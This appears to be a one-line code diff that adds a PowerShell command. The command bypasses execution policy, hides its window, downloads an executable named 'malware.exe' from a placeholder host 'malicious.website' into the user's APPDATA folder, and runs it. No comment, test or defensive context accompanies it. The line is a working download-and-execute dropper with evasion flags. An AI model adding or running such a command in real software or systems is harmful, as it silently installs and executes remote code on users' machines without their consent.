@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile("http://malicious.website/malware.exe","$env:APPDATA\bad.exe"); Start-Process("$env:APPDATA\bad.exe")
